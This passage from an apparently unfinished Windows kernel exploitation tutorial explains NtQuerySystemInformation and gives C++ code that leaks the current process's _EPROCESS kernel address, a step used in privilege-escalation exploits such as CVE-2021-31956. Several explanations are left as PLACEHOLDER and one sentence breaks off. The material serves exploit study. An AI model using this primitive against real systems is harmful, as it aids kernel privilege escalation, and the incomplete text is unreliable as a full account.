<p>During the loop, if the return value <code>status</code> of <code>NtQuerySystemInformation</code> is equal to <code>STATUS_INFO_LENGTH_MISMATCH</code>, the loop assigns the <code>handle_info</code> a new memory allocation with <code>realloc</code> where the size, <code>handle_info_sz</code> is multiplied by two each iteration. If the memory reallocation fails, the <code>status</code> is assigned the value <code>STATUS_NO_MEMORY</code> and the function terminates early. After the loop completes without any reallocation errors, the <code>status</code> value is checked against <code>NT_STATUS</code> and if it fails, the function again terminates early.</p>
<p>Before moving to discuss the reasoning behind the <code>STATUS_INFO_LENGTH_MISMATCH</code> loop, let's break down <code>NtQuerySystemInformation</code> and first look at its function prototype:</p>
<pre><code class="language-cpp">__kernel_entry NTSTATUS NtQuerySystemInformation(
  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,
  [in, out]       PVOID                    SystemInformation,
  [in]            ULONG                    SystemInformationLength,
  [out, optional] PULONG                   ReturnLength
);
</code></pre>
<p>Let's now break down each parameter and how it's used within the context of our call with <code>NtQuerySystemInformation</code>:</p>
<ul>
<li><code>SystemHandleInformation</code>: According to <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntexapi/system_information_class.htm">Geoff Chappell</a> the hex value for <code>SystemHandleInformation</code> is <code>0x10</code> while the <code>SYSTEM_INFORMATION_CLASS</code> enumeration itself remains undocumented by Microsoft.</li>
<li><code>handle_info</code>: PLACEHOLDER</li>
<li><code>handle_info_sz</code>: PLACEHOLDER</li>
<li><code>NULL</code>: PLACEHOLDER</li>
</ul>
<p>Let's now discuss why the <code>STATUS_INFO_LENGTH_MISMATCH</code> value is checked against the <code>NtQuerySystemInformation</code> call in a loop. According to this answer on <a href="https://stackoverflow.com/questions/46108382/ntquerysysteminformation-returns-24-error-bad-length">Stack Overflow</a>,</p>
<pre><code class="language-cpp">printf("[+] Fetched %ld handles\n", handle_info-&gt;NumberOfHandles);

for (int i = 0; i &lt; handle_info-&gt;NumberOfHandles; i++)
    if (handle_info-&gt;Handles[i].dwProcessId == GetCurrentProcessId() &amp;&amp; handle_info-&gt;Handles[i].wValue == current_proc) {
        status = STATUS_SUCCESS;
        printf("[+] _EPROCESS of current process: %p\n", handle_info-&gt;Handles[i].pAddress);
        *eproc = (ULONG_PTR)handle_info-&gt;Handles[i].pAddress;
        free(handle_info);
        goto out;
    }

out:
    CloseHandle(current_proc);

    return status;
</code></pre>
<p>PLACEHOLDER</p>
<h1 id="references"><a class="header" href="#references">References</a></h1>
<p><a href="#table-of-contents">Return to Top</a></p>
<ul>
<li><a href="https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/">Rapid7's Blog</a></li>
<li><a href="https://web.archive.org/web/20191229080007/https://gracefulbits.com/2018/08/13/find-which-process-is-using-the-microphone-from-a-kernel-mode-driver/">Alex Ionescu's Blog</a></li>
<li><a href="https://blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf.html">Gabrielle Viala's Blog</a></li>
<li><a href="https://research.nccgroup.com/2021/07/15/cve-2021-31956-exploiting-the-windows-kernel-ntfs-with-wnf-part-1/">Alex Plaskett's Blog</a></li>
<li><a href="https://decoded.avast.io/janvojtesek/exploit-kits-vs-google-chrome/">Jan Vojtesek's Blog</a></li>
<li><a href="https://y3a.github.io/2022/09/03/cve-2021-31956/">Y3A's Blog</a></li>
<li><a href="https://github.com/Y3A/CVE-2021-31956">Y3A's Proof-of-Concept</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../geoffchappell/win32/toc.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../tools/WinDbg.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../geoffchappell/win32/toc.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../tools/WinDbg.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
